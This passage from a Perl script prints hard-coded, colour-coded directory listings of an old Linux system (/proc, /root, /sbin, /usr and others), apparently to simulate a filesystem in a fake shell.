drwxr-xr-x   6 root     root         4096 Jan  9 12:51$azul_claro ..$normal
EOT
}

sub list_51
{
   # /mnt/cdrom
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Mar 28  2000$azul_claro .$normal
drwxr-xr-x   6 root     root         4096 Jan  9 12:51$azul_claro ..$normal
EOT
}

sub list_52
{
   # /mnt/floppy
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Apr 26  2000$azul_claro .$normal
drwxr-xr-x   6 root     root         4096 Jan  9 12:51$azul_claro ..$normal
EOT
}

sub list_53
{
   # /opt
   print STDERR << "EOT"
drwxr-xr-x   5 root     root         4096 Oct  3  1999$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
EOT
}

sub list_54
{
   # /proc
   print STDERR << "EOT"
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro 98$normal
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro bus$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 cmdline$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 cpuinfo$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 devices$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 dma$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 fb$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 filesystems$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro fs$normal
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro ide$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 interrupts$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 ioports$normal
-r--------   1 root     root     32509952 Jan 29 22:45 kcore$normal
-r--------   1 root     root            0 Jan 29 19:52 kmsg$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 ksyms$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 loadavg$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 locks$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 mdstat$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 meminfo$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 misc$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 modules$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 mounts$normal
-rw-r--r--   1 root     root          274 Jan 29 22:45 mtrr$normal
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro net$normal
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro parport$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 partitions$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 pci$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 rtc$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro scsi$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 slabinfo$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 sound$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 stat$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 swaps$normal
dr-xr-xr-x  10 root     root            0 Jan 29 22:45$azul_claro sys$normal
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro tty$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 uptime$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 version$normal
EOT
}

sub list_55
{
   # /proc/98
   print STDERR << "EOT"
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 cmdline$normal
-r--------   1 root     root            0 Jan 29 22:45 environ$normal
dr-x------   2 root     root            0 Jan 29 22:45$azul_claro fd$normal
pr--r--r--   1 root     root            0 Jan 29 22:45 maps$normal
-rw-------   1 root     root            0 Jan 29 22:45 mem$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 stat$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 statm$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 status$normal
EOT
}

sub list_56
{
   # /proc/98/fd
   print STDERR << "EOT"
dr-x------   2 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro ..$normal
lrwx------   3 root     root            0 Jan 29 22:45$azul_claro2 0$normal ->$amarelo /dev/pts/1$normal
lrwx------   3 root     root            0 Jan 29 22:45$azul_claro2 1$normal ->$amarelo /dev/pts/1$normal
lrwx------   3 root     root            0 Jan 29 22:45$azul_claro2 2$normal ->$amarelo /dev/pts/1$normal
EOT
}

sub list_57
{
   # /proc/bus
   print STDERR << "EOT"
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro pccard$normal
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro pci$normal
EOT
}

sub list_58
{
   # /proc/bus/pccard
   print STDERR << "EOT"
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro ..$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 memory$normal
EOT
}

sub list_59
{
   # /proc/bus/pci
   print STDERR << "EOT"
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro ..$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro 00$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 devices$normal
EOT
}

sub list_60
{
   # /proc/bus/pci/00
   print STDERR << "EOT"
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro ..$normal
-rw-r--r--   1 root     root          256 Jan 29 22:45 00.0$normal
-rw-r--r--   1 root     root          256 Jan 29 22:45 01.0$normal
-rw-r--r--   1 root     root          256 Jan 29 22:45 01.1$normal
-rw-r--r--   1 root     root          256 Jan 29 22:45 14.0$normal
EOT
}

sub list_61
{
   # /proc/fs
   print STDERR << "EOT"
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
EOT
}

sub list_62
{
   # /proc/ide
   print STDERR << "EOT"
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 drivers$normal
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro ide0$normal
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro ide1$normal
EOT
}

sub list_63
{
   # /proc/net
   print STDERR << "EOT"
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 arp$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 dev$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 dev_mcast$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 dev_stat$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 igmp$normal
-rw-------   1 root     root            0 Jan 29 22:45 ip_fwchains$normal
-rw-------   1 root     root            0 Jan 29 22:45 ip_fwnames$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro ip_masq$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 ip_masquerade$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 netlink$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 netstat$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 raw$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 route$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro rpc$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 rt_cache$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 snmp$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 sockstat$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 tcp$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 tr_rif$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 udp$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 unix$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 wireless$normal
EOT
}

sub list_64
{
   # /proc/parport
   print STDERR << "EOT"
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro 0$normal
EOT
}

sub list_65
{
   # /proc/scsi
   print STDERR << "EOT"
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
-rw-r--r--   1 root     root            0 Jan 29 22:45 scsi$normal
EOT
}

sub list_66
{
   # /proc/sys
   print STDERR << "EOT"
dr-xr-xr-x  10 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro debug$normal
dr-xr-xr-x   3 root     root            0 Jan 29 22:45$azul_claro dev$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro fs$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro kernel$normal
dr-xr-xr-x   8 root     root            0 Jan 29 22:45$azul_claro net$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro proc$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro sunrpc$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro vm$normal
EOT
}

sub list_67
{
   # /proc/tty
   print STDERR << "EOT"
dr-xr-xr-x   4 root     root            0 Jan 29 22:45$azul_claro .$normal
dr-xr-xr-x  43 root     root            0 Jan 29 17:52$azul_claro ..$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro driver$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 drivers$normal
dr-xr-xr-x   2 root     root            0 Jan 29 22:45$azul_claro ldisc$normal
-r--r--r--   1 root     root            0 Jan 29 22:45 ldiscs$normal
EOT
}

sub list_68
{
   # /root
   print STDERR << "EOT"
drwxr-x---  55 root     root         4096 Jan 27 12:33$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
-rw-------   1 root     root         1629 Apr 27  2000 .ICEauthority$normal
-rw-------   1 root     root            0 Apr 26  2000 .Xauthority$normal
-rw-r--r--   1 root     root         1867 Nov 15 20:07 .acrorc$normal
-rw-r--r--   1 root     root            0 Apr  1  2000 .addressbook$normal
-rw-------   1 root     root         2285 Apr  1  2000 .addressbook.lu$normal
-rw-r--r--   1 root     root          170 Oct  2 07:36 .aumixrc$normal
-rw-------   1 root     root         4190 Jan 28 23:42 .bash_history$normal
-rw-r--r--   1 root     root          678 Jan 29 20:58 .blackboxrc$normal
-rw-------   1 root     root           16 Mar 28  2000 .esd_auth$normal
-rw-r--r--   1 root     root          282 Apr 21  2000 .esshshrc$normal
-rw-------   1 root     root           43 Apr 27  2000 .fetchhost$normal
-rw-r--r--   1 root     root            0 Apr 29  2000 .fishingboat$normal
-rw-r--r--   1 root     root          147 Mar 28  2000 .gtkrc$normal
-rw-r--r--   1 root     root           51 Mar 29  2000 .ircservers$normal
-rw-r--r--   1 root     root         1310 Jan 27 12:29 .kderc$normal
-rw-r--r--   1 root     root            0 Nov 14 21:13 .kmid_collections$normal
-rw-r--r--   1 root     root            4 Jan 27 12:29 .kss-install.pid.localhost$normal
-rw-r--r--   1 root     root           48 Sep 10  1996 .less$normal
-rw-r--r--   1 root     root          114 May  7  1993 .lesskey$normal
-rw-------   1 root     root         1733 Jan 27 12:33 .lynx_cookies$normal
-rw-r--r--   1 root     root           11 Sep  7 09:16 .mh_profile$normal
-rw-r--r--   1 root     root         1204 Apr  2  2000 .midnightrc$normal
-rw-r--r--   1 root     root        12851 Apr 27  2000 .nessusrc$normal
-rw-r--r--   1 root     root            0 Apr 29  2000 .netwatch.0.9g$normal
-rw-r--r--   1 root     root            0 Nov 18 16:39 .newsrc$normal
-rw-------   1 root     root          588 Apr 26  2000 .newsrc-forums.inprise.com$normal
-rw-------   1 root     root            0 Jul 22  2000 .newsrc-news$normal
-rw-------   1 root     root         9613 Sep  7 09:26 .pine-debug1$normal
-rw-------   1 root     root        11004 Sep  7 09:26 .pine-debug2$normal
-rw-------   1 root     root         9408 Aug 20 13:24 .pine-debug3$normal
-rw-------   1 root     root         9798 Aug  8 09:25 .pine-debug4$normal
-rw-r--r--   1 root     root        13760 Sep  7 09:24 .pinerc$normal
-rw-r--r--   1 root     root            0 Apr 22  2000 .saves-261-localhost~$normal
-rw-r--r--   1 root     root          347 Sep  1 14:20 .screenrc$normal
-rw-------   1 root     root          405 Apr 26  2000 .shad$normal
-rw-r--r--   1 root     root         1071 Oct  3 05:41 .studio.cfg$normal
-rw-r--r--   1 root     root         1060 Jan 16 00:44 .tuxracer$normal
-rw-r--r--   1 root     root            0 Apr 29  2000 .watchlog.000$normal
-rw-r--r--   1 root     root         6940 Aug  2  2000 .winerc$normal
-rw-r--r--   1 root     root         7005 Aug  2  2000 .winerc.bak$normal
-rw-r--r--   1 root     root         6982 Aug  2  2000 .winerc.old$normal
-rw-r--r--   1 root     root          401 Jan 13 14:24 .workmandb$normal
-rw-r--r--   1 root     root          140 Jan 13 14:24 .workmanrc$normal
-rw-r--r--   1 root     root          603 Jan 27 12:29 .xinitrc$normal
-rw-r--r--   1 root     root         3383 Aug 21 22:17 .xpilotrc$normal
-rw-r--r--   1 root     root         3417 Aug 21 22:04 .xpilotrc.bak$normal
-rw-------   1 root     root         1025 Apr 26  2000 .xsession-errors$normal
-rw-------   1 root     root        49935 Dec 31 12:47 Lynx.trace$normal
-rw-r--r--   1 root     root           98 Jan  2 18:57 TODO$normal
-rw-r--r--   1 root     root        57288 Nov 19 02:16 anarch2.txt$normal
-rw-r--r--   1 root     root       462309 Nov 19 02:02 anarchy.htm$normal
-rwxr-xr-x   1 root     root          241 Apr 29  2000$verde_claro bm.txt$normal
-rw-r--r--   1 root     root         3901 Nov 24 17:32 bombas$normal
-rw-r--r--   1 root     root        36277 Sep 25 07:19 haz.jpg$normal
-rw-r--r--   1 root     root       797453 Dec 30 00:16 hp.tar.gz$normal
-rw-r--r--   1 root     root        63236 Jan 13 14:29 log$normal
-rw-r--r--   1 root     root         1775 Jan  8 02:22 lynx_bookmarks.html$normal
-rw-------   1 root     root          531 Sep  7 09:26 mbox$normal
-rw-r--r--   1 root     root          988 Jan  8 03:56 minicom.log$normal
-rwxr-xr-x   1 root     root        36320 Dec 30 00:16$verde_claro pop3.txt$normal
-rw-r--r--   1 root     root         1404 Nov 19 01:15 smoke.html$normal
-rw-r--r--   1 root     root         2604 Nov 19 01:30 smoke2.html$normal
-rw-r--r--   1 root     root         5717 Nov 19 01:39 smoke3.html$normal
-rw-r--r--   1 root     root         1643 Nov 14 23:06 suids$normal
-rwxr-xr-x   1 root     root         2138 Nov 18 18:57$verde_claro teste.pl$normal
-rw-r--r--   1 root     root         3931 Jan 16 13:00 trace$normal
-rwxr-xr-x   1 root     root         1757 Dec 30 00:16$verde_claro txt.txt$normal
-rw-r--r--   1 root     root           62 Dec 30 02:34 url$normal
EOT
}

sub list_69
{
   # /sbin
   print STDERR << "EOT"
drwxr-xr-x   2 root     bin          4096 Apr 26  2000$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
-rwxr-xr-x   1 root     bin         13924 Aug  1  1999$verde_claro agetty$normal
-rwxr-xr-x   1 root     bin         15892 Sep  6  1999$verde_claro dump_cis$normal
-rwxr-xr-x   1 root     bin          6816 Sep 27  1999$verde_claro dumpe2fs$normal
-rwxr-xr-x   1 root     bin         73172 Sep 27  1999$verde_claro e2fsck$normal
-rwxr-xr-x   1 root     bin          4660 Sep 27  1999$verde_claro e2label$normal
-rwxr-xr-x   1 root     bin         86984 Aug  1  1999$verde_claro fdisk$normal
-rwxr-xr-x   1 root     bin         12580 Sep 27  1999$verde_claro fsck$normal
-rwxr-xr-x   1 root     bin            36 Aug  2  1999$verde_claro fsck.ext2$normal
-rwxr-xr-x   1 root     bin         25764 Aug  1  1999$verde_claro fsck.minix$normal
-rwxr-xr-x   1 root     bin          5940 Sep  6  1999$verde_claro ftl_check$normal
-rwxr-xr-x   1 root     bin          7096 Sep  6  1999$verde_claro ftl_format$normal
-rwxr-xr-x   1 root     bin         32904 Oct 10  1999$verde_claro genksyms$normal
-rwxr-xr-x   1 root     bin         30696 Jul 30  1999$verde_claro getty$normal
-rwxr-xr-x   1 root     bin          7432 Oct 14  1999$verde_claro halt$normal
-rwxr-xr-x   1 root     bin         31780 Aug  1  1999$verde_claro hwclock$normal
-rwxr-xr-x   1 root     bin          3616 Sep  6  1999$verde_claro ide_info$normal
-rwxr-xr-x   1 root     bin         33724 Oct 22  1999$verde_claro ifconfig$normal
-rwxr-xr-x   1 root     bin          4332 Sep  6  1999$verde_claro ifport$normal
-rwxr-xr-x   1 root     bin          5136 Sep  6  1999$verde_claro ifuser$normal
-rwxr-xr-x   1 root     bin        337732 Oct 14  1999$verde_claro init$normal
-rwxr-xr-x   1 root     bin           710 Oct 14  1999$verde_claro initscript.sample$normal
-rwxr-xr-x   1 root     bin         30928 Oct 10  1999$verde_claro insmod$normal
-rwxr-xr-x   1 root     bin         10493 Oct 16  1999$verde_claro installpkg$normal
-rwxr-xr-x   1 root     bin         38008 Oct 25  1999$verde_claro ipchains$normal
-rwxr-xr-x   1 root     bin          3019 Oct 25  1999$verde_claro ipchains-restore$normal
-rwxr-xr-x   1 root     bin          4112 Oct 25  1999$verde_claro ipchains-save$normal
-rwxr-xr-x   1 root     bin           532 Oct 23  1998$verde_claro ipfwadm$normal
-rwxr-xr-x   1 root     bin        260340 Oct 25  1999$verde_claro ipfwadm-2.3.0$normal
-rwxr-xr-x   1 root     bin         21956 Oct 25  1999$verde_claro ipfwadm-wrapper$normal
-rwxr-xr-x   1 root     bin         30932 Aug  3  1999$verde_claro isapnp$normal
-rwxr-xr-x   1 root     bin          6276 Aug  1  1999$verde_claro jaztool$normal
-rwxr-xr-x   1 root     bin          5860 Aug  1  1999$verde_claro kbdrate$normal
-rwxr-xr-x   1 root     bin         11264 Oct 10  1999$verde_claro kerneld$normal
-rwxr-xr-x   1 root     bin          8644 Oct 14  1999$verde_claro killall5$normal
-rwxr-xr-x   1 root     bin          7772 Oct 10  1999$verde_claro ksyms$normal
-rwxr-xr-x   1 root     bin        109628 Jun 25  1999$verde_claro ldconfig$normal
-rwxr-xr-x   1 root     bin         68460 Aug  1  1999$verde_claro lilo$normal
-rwxr-xr-x   1 root     bin         39922 Sep 10  1999$verde_claro liloconfig$normal
-rwxr-xr-x   1 root     bin            47 Mar 27  1999$verde_claro liloconfig.tty$normal
-rwxr-xr-x   1 root     bin          7324 Aug  1  1999$verde_claro losetup$normal
-rwxr-xr-x   1 root     bin         46316 Oct 10  1999$verde_claro lsmod$normal
-rwxr-xr-x   1 root     bin         30032 Aug  3  1999$verde_claro lspci$normal
-rwxr-xr-x   1 root     bin          7229 Jun 25  1998$verde_claro makebootdisk$normal
-rwxr-xr-x   1 root     bin          5581 Mar 29  1999$verde_claro makepkg$normal
-rwxr-xr-x   1 root     bin         16740 Sep 20  1999$verde_claro mkdosfs$normal
-rwxr-xr-x   1 root     bin         19108 Sep 27  1999$verde_claro mke2fs$normal
-rwxr-xr-x   1 root     bin          5156 Aug  1  1999$verde_claro mkfs$normal
-rwxr-xr-x   1 root     bin         16420 Aug  1  1999$verde_claro mkfs.minix$normal
-rwxr-xr-x   1 root     bin          4360 Sep 27  1999$verde_claro mklost+found$normal
-rwxr-xr-x   1 root     bin          9264 Aug  1  1999$verde_claro mkswap$normal
-rwxr-xr-x   1 root     bin         16328 Oct 10  1999$verde_claro modinfo$normal
-rwxr-xr-x   1 root     bin         23140 Oct 10  1999$verde_claro modprobe$normal
-rwxr-xr-x   1 root     bin         15766 Oct 14  1999$verde_claro netconfig.color$normal
-rwxr-xr-x   1 root     bin         12652 Oct 14  1999$verde_claro netconfig.tty$normal
-rwxr-xr-x   1 root     bin         27960 Sep  6  1999$verde_claro pack_cis$normal
-r-xr-xr-x   1 root     bin          4822 Sep  6  1999$verde_claro pcinitrd$normal
-rwxr-xr-x   1 root     bin         22563 Aug 20  1999$verde_claro pkgtool.tty$normal
-rwxr-xr-x   1 root     bin          4628 Oct 22  1999$verde_claro plipconfig$normal
-rwxr-xr-x   1 root     bin         29732 Aug  3  1999$verde_claro pnpdump$normal
-rwxr-xr-x   1 root     bin         21524 Oct 14  1999$verde_claro powerd$normal
-rwxr-xr-x   1 root     bin         11236 Aug  3  1999$verde_claro quotacheck$normal
-rwxr-xr-x   1 root     bin          6244 Aug  3  1999$verde_claro quotaon$normal
-rwxr-xr-x   1 root     bin         15476 Oct 22  1999$verde_claro rarp$normal
-rwxr-xr-x   1 root     bin          8100 Aug  1  1999$verde_claro rdev$normal
-rwxr-xr-x   1 root     bin          8901 Mar 25  1999$verde_claro removepkg$normal
-rwxr-xr-x   1 root     bin          1046 Oct 10  1999$verde_claro request-route$normal
-rwxr-x---   1 root     bin         19636 Oct 11  1999 rmt$normal
-rwxr-xr-x   1 root     bin         31032 Oct 22  1999$verde_claro route$normal
-rwxr-xr-x   1 root     bin         26372 Oct 22  1999$verde_claro rpc.portmap$normal
-rwxr-xr-x   1 root     bin          3392 Oct 14  1999$verde_claro runlevel$normal
-rwxr-xr-x   1 root     bin          5036 Sep  6  1999$verde_claro scsi_info$normal
-rwxr-xr-x   1 root     bin         21128 Aug  3  1999$verde_claro setpci$normal
-rwxr-xr-x   1 root     bin         16280 Aug  1  1999$verde_claro setserial$normal
-rwxr-xr-x   1 root     bin          4544 Oct 14  1999$verde_claro setserialbits$normal
-rwxr-xr-x   1 root     bin         55247 Oct 11  1999$verde_claro setup.tty$normal
-rwxr-xr-x   1 root     bin         14552 Oct 14  1999$verde_claro shutdown$normal
-rwxr-xr-x   1 root     root       948555 Sep 15  1999$verde_claro sln$normal
-rwxr-xr-x   1 root     root        14476 Jun 23  1999$verde_claro sulogin$normal
-rwxr-xr-x   1 root     bin          6960 Aug  1  1999$verde_claro swapon$normal
-rwxr-xr-x   1 root     bin         46316 Oct 10  1999$verde_claro lsmod$normal
-rwxr-xr-x   1 root     bin         46316 Oct 10  1999$verde_claro insmod$normal
-rwxr-xr-x   1 root     bin         46316 Oct 10  1999$verde_claro rmmod$normal
EOT
}

sub list_70
{
   # /tmp
   print STDERR << "EOT"
drwxrwxrwt  21 root     root         4096 Jan 29 21:22$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
EOT
}

sub list_71
{
   # /usr
   print STDERR << "EOT"
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
drwxr-xr-x   2 root     bin         24576 Jan 20 04:48$azul_claro bin$normal
drwxr-xr-x  13 root     root         4096 Nov 21 03:11$azul_claro doc$normal
drwxr-xr-x   5 root     root         4096 Apr 26  2000$azul_claro etc$normal
drwxr-xr-x   3 root     root         4096 Aug 22 00:40$azul_claro games$normal
drwxr-xr-x   4 root     root         4096 Jun 22  1999$azul_claro i386-daniel-os$normal
drwxr-xr-x  65 root     root         8192 Nov 21 03:27$azul_claro include$normal
drwxr-xr-x  59 root     root        16384 Dec 19 15:45$azul_claro lib$normal
drwxr-xr-x  16 root     root         4096 Jan 16 00:53$azul_claro local$normal
drwxr-xr-x  25 root     root         4096 Oct  8  1999$azul_claro man$normal
drwxr-xr-x   2 root     bin          4096 Jan  2 20:00$azul_claro sbin$normal
EOT
}

sub list_72
{
   # /usr/bin
   print STDERR << "EOT"
drwxr-xr-x   2 root     bin         24576 Jan 20 04:48$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
-rwxr-xr-x   1 root     bin          3652 Sep 23  1999$verde_claro clear$normal
-rwxr-xr-x   1 root     bin        115576 Aug 19  1999$verde_claro wget$normal
-rwxr-xr-x   1 root     bin          9052 Jul 30  1999$verde_claro id$normal
-rwxr-xr-x   1 root     bin          9500 Jul 31  1999$verde_claro who$normal
-rwxr-xr-x   1 root     bin          4960 Ago  1  1999$verde_claro whoami$normal
-rwxr-xr-x   1 root     bin         25960 Ago  2  1999$verde_claro score$normal
-rwxr-xr-x   1 root     bin         33411 Ago  2  1999$verde_claro screen$normal
-rwxr-xr-x   1 root     bin         43564 Ago  2  1999$verde_claro xaos$normal
-rwxr-xr-x   1 root     bin        282968 Oct 23  1999$verde_claro nslookup$normal
EOT
}

sub list_73
{
   # /usr/doc
   print STDERR << "EOT"
drwxr-xr-x  13 root     root         4096 Nov 21 03:11$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
EOT
}

sub list_74
{
   # /usr/etc
   print STDERR << "EOT"
drwxr-xr-x   5 root     root         4096 Apr 26  2000$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
EOT
}

sub list_75
{
   # /usr/games
   print STDERR << "EOT"
drwxr-xr-x   3 root     root         4096 Aug 22 00:40$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
EOT
}

sub list_76
{
   # /usr/i386-daniel-os
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
EOT
}

sub list_77
{
   # /usr/include
   print STDERR << "EOT"
drwxr-xr-x  65 root     root         8192 Nov 21 03:27$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
-rw-r--r--   1 root     root           83 Sep 15  1999 a.out.h$normal
-rw-r--r--   1 root     root         9058 Oct 10  1999 aalib.h$normal
-rw-r--r--   1 root     root         3319 Sep 15  1999 assert.h$normal
EOT
}

sub list_78
{
   # /usr/lib
   print STDERR << "EOT"
drwxr-xr-x  59 root     root        16384 Dec 19 15:45$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
-rw-r--r--   1 root     root       126904 Oct 10  1999 libaa.a$normal
-rwxr-xr-x   1 root     root          394 Oct 10  1999$verde_claro libaa.la$normal
-rwxr-xr-x   1 root     root        91856 Feb 16  2000$verde_claro libaa.so.1.0.3$normal
-rw-r--r--   1 root     root     20019674 Sep 15  1999 libc.a$normal
-rw-r--r--   1 root     root          178 Sep 15  1999 libc.so$normal
-rw-r--r--   1 root     root        69390 Sep 15  1999 libc_nonshared.a$normal
-rw-r--r--   1 root     root     20117352 Sep 15  1999 libc_p.a$normal
-rw-r--r--   1 root     root        95920 Sep 17  1999 libcrypt.a$normal
-rw-r--r--   1 root     root        96820 Sep 17  1999 libcrypt_p.a$normal
-rw-r--r--   1 root     root       146704 Oct 10  1999 libmpeg.a$normal
-rw-r--r--   1 root     root        24094 Sep 28  1999 libname-server.a$normal
-rw-r--r--   1 root     root       267246 Sep 17  1999 libncur194.a$normal
-rw-r--r--   1 root     root       378910 Sep 23  1999 libncurses.a$normal
-rw-r--r--   1 root     root      3553496 Sep 23  1999 libncurses_g.a$normal
-rw-r--r--   1 root     root       398504 Sep 23  1999 libncurses_p.a$normal
-rw-r--r--   1 root     root        42872 Apr 27  2000 libnet.a$normal
-rwxr-xr-x   1 root     root        59684 Apr 27  2000$verde_claro libnids.so$normal
EOT
}

sub list_79
{
   # /usr/local
   print STDERR << "EOT"
drwxr-xr-x  16 root     root         4096 Jan 16 00:53$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
EOT
}

sub list_80
{
   # /usr/man
   print STDERR << "EOT"
drwxr-xr-x  25 root     root         4096 Oct  8  1999$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan  1  2000$azul_claro ..$normal
-rw-r--r--   1 root     root         1637 Mar 29  1999 Makefile$normal
drwxr-xr-x   2 root     root        20480 Nov 21 03:27$azul_claro man1$normal
drwxr-xr-x   2 root     root         8192 Aug  8  1995$azul_claro man2$normal
drwxr-xr-x   2 root     root        49152 Nov 21 03:27$azul_claro man3$normal
drwxr-xr-x   2 root     root         4096 Apr 27  2000$azul_claro man4$normal
drwxr-xr-x   2 root     root         4096 Nov 21 03:27$azul_claro man5$normal
drwxr-xr-x   2 root     root         4096 Nov 21 03:27$azul_claro man6$normal
drwxr-xr-x   2 root     root         4096 Nov 21 03:27$azul_claro man7$normal
drwxr-xr-x   2 root     root         8192 Dec 26 14:42$azul_claro man8$normal
drwxr-xr-x   2 root     root         4096 Nov 24  1993$azul_claro man9$normal
drwxr-xr-x   2 root     root         8192 Mar 28  2000$azul_claro mann$normal
-rw-r--r--   1 root     root       151116 Apr 22  1999 whatis$normal
EOT
}

sub list_81
{
   # /usr/sbin
